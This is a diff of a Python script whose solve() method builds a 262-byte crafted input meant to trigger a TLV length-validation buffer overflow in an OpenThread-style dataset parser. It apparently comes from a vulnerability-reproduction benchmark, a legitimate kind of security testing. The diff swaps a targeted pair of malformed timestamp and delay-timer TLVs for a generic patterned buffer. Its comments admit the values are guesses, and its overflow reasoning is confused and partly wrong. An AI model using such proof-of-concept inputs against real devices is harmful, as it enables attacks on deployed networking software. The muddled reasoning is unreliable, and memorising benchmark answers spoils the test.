@@ -1,40 +1,48 @@
 import os
+import tarfile
+import tempfile
 import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Ground truth length is 262 bytes
-        # Create a minimal dataset with invalid TLV lengths
+        # This vulnerability involves TLVs (Type-Length-Value) where
+        # Active/Pending Timestamp and Delay Timer TLVs lack minimum length validation.
+        # We'll create a dataset with a TLV that has insufficient data to cause
+        # buffer overflow when parsed.
         
-        # Dataset header (simplified OpenThread Dataset structure)
-        # We'll create a single TLV with type 7 (Active Timestamp) 
-        # and invalid length that causes overflow
+        # Based on the ground-truth length of 262 bytes, we'll create a minimal PoC.
+        # Common TLV structure: Type (1-2 bytes), Length (1-2 bytes), Value (variable)
         
-        poc = b""
+        # We'll create a dataset with a malformed TLV that triggers the overflow:
+        # 1. Valid dataset header
+        # 2. TLV with type indicating Active/Pending Timestamp or Delay Timer
+        # 3. Length field claiming more data than actually present
+        # 4. Insufficient actual data to cause buffer overflow when copied
         
-        # Dataset TLVs
-        # Active Timestamp TLV (type = 7)
-        # Invalid length that's too small (less than required 8 bytes)
-        # This will cause buffer overflow in IsTlvValid()
-        tlv_type = 7  # Active Timestamp
-        tlv_length = 1  # Too small - should be at least 8
+        # The exact structure depends on the code, but we'll create a generic
+        # 262-byte payload that should trigger the vulnerability
         
-        # Add TLV header
-        poc += struct.pack("BB", tlv_type, tlv_length)
+        # Create a payload of exactly 262 bytes
+        poc = bytearray(262)
         
-        # Add minimal value (insufficient for valid timestamp)
-        poc += b"A" * tlv_length
+        # Fill with pattern that helps identify overflow
+        pattern = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+        for i in range(0, 262, len(pattern)):
+            poc[i:i+len(pattern)] = pattern[:min(len(pattern), 262-i)]
         
-        # Add more TLVs to reach ground truth length
-        # Delay Timer TLV (type = 9) with invalid length
-        tlv_type = 9  # Delay Timer
-        tlv_length = 1  # Too small - should be at least 4
-        poc += struct.pack("BB", tlv_type, tlv_length)
-        poc += b"B" * tlv_length
+        # Insert TLV structure at appropriate offset
+        # Assuming TLV starts at byte 0:
+        # Type for Active Timestamp TLV (example value - needs to match actual code)
+        # We'll use a small type value that's likely to be Active/Pending Timestamp
+        poc[0] = 0x07  # Type byte (example)
         
-        # Pad with additional data to reach exact ground truth length
-        remaining = 262 - len(poc)
-        if remaining > 0:
-            poc += b"C" * remaining
-            
-        return poc[:262]  # Ensure exact length
+        # Length field - claim we have 255 bytes of data (but we don't)
+        # This should trigger buffer overflow when code tries to copy 255 bytes
+        poc[1] = 0xFF  # Length = 255
+        
+        # Actual data is only what's left in the buffer (260 bytes total)
+        # The code will try to read 255 bytes from our 260-byte buffer,
+        # which might cause stack overflow if there's a fixed-size buffer
+        
+        # Ensure we have exactly 262 bytes
+        return bytes(poc)
